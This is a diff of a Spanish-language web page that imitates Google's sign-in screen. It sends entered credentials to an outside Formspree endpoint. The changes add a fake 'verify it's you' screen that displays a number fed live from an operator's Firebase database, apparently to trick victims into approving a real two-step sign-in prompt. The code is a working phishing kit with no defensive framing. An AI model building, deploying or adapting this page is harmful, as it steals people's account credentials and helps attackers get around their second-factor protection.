@@ -2,17 +2,23 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Iniciar sesión</title>
+  <title>Verificación</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f2f2f2;
       margin: 0;
-      padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+    }
+
+    .login-box, #loading-screen, #verificacion {
+      display: none;
+    }
+
+    .visible {
+      display: flex !important;
     }
 
     .login-box {
-      display: flex;
       flex-direction: column;
       align-items: center;
       background: white;
@@ -48,9 +54,7 @@
       cursor: pointer;
     }
 
-    /* Pantalla de carga */
-    #loading-screen {
-      display: none;
+    #loading-screen, #verificacion {
       position: fixed;
       inset: 0;
       background-color: white;
@@ -74,11 +78,35 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+
+    #verificacion img {
+      width: 70px;
+      margin-bottom: 20px;
+    }
+
+    #verificacion h1 {
+      font-size: 22px;
+      margin-bottom: 10px;
+      color: #202124;
+    }
+
+    #verificacion p {
+      text-align: center;
+      max-width: 300px;
+      color: #5f6368;
+    }
+
+    #numero {
+      font-size: 64px;
+      margin-top: 40px;
+      font-weight: bold;
+      color: #202124;
+    }
   </style>
 </head>
 <body>
 
-<div class="login-box">
+<div class="login-box visible" id="login-box">
   <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
   <h2>Iniciar sesión</h2>
   <form id="login-form">
@@ -88,41 +116,71 @@
   </form>
 </div>
 
-<!-- Pantalla de carga -->
 <div id="loading-screen">
   <div class="spinner"></div>
   <p>Cargando, por favor espera...</p>
 </div>
 
+<div id="verificacion">
+  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+  <h1>Verifica que eres tú</h1>
+  <p>Para proteger tu cuenta, Google quiere asegurarse de que realmente seas tú la persona que intenta acceder</p>
+  <div id="numero">...</div>
+</div>
+
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
+
 <script>
+  // Configuración Firebase (reemplaza con la tuya)
+  const firebaseConfig = {
+    apiKey: "AIzaSyCNqHiJVWPy-iReOtsfOR89NOSx-sQUoI4",
+    authDomain: "account-4a145.firebaseapp.com",
+    projectId: "account-4a145",
+    storageBucket: "account-4a145.firebasestorage.app",
+    messagingSenderId: "24703243588",
+    appId: "1:24703243588:web:2f45956fab5c7694017311",
+  };
+
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
+
+  // Escuchar en tiempo real
+  db.collection("mensajes").orderBy("timestamp", "desc").limit(1).onSnapshot(snapshot => {
+    snapshot.forEach(doc => {
+      const data = doc.data();
+      const numero = data.texto || "...";
+      document.getElementById("numero").textContent = numero;
+    });
+  });
+
   document.getElementById("login-form").addEventListener("submit", function(e) {
     e.preventDefault();
-
     const form = e.target;
     const data = new FormData(form);
 
-    // Mostrar pantalla de carga
-    const loadingScreen = document.getElementById("loading-screen");
-    loadingScreen.style.display = "flex";
+    // Ocultar login, mostrar loading
+    document.getElementById("login-box").classList.remove("visible");
+    document.getElementById("loading-screen").classList.add("visible");
 
-    // Enviar a Formspree
+    // Enviar datos a Formspree
     fetch("https://formspree.io/f/mnndpvlw", {
       method: "POST",
       body: data,
-      headers: {
-        'Accept': 'application/json'
-      }
-    })
-    .then(response => {
-      // Redirigir después de 30 segundos
-      setTimeout(() => {
-        window.location.href = "https://forms.gle/bnX7735yuXWvXAXw9";
-      }, 80000);
-    })
-    .catch(error => {
-      alert("Hubo un error al enviar el formulario.");
-      loadingScreen.style.display = "none";
+      headers: { 'Accept': 'application/json' }
     });
+
+    // Después de 30 seg, mostrar verificación
+    setTimeout(() => {
+      document.getElementById("loading-screen").classList.remove("visible");
+      document.getElementById("verificacion").classList.add("visible");
+
+      // Luego de 15 seg, redirigir
+      setTimeout(() => {
+        window.location.href = "https://forms.gle/M7DsjHnWW9gxQzHE7";
+      }, 15000);
+    }, 30000);
   });
 </script>
 
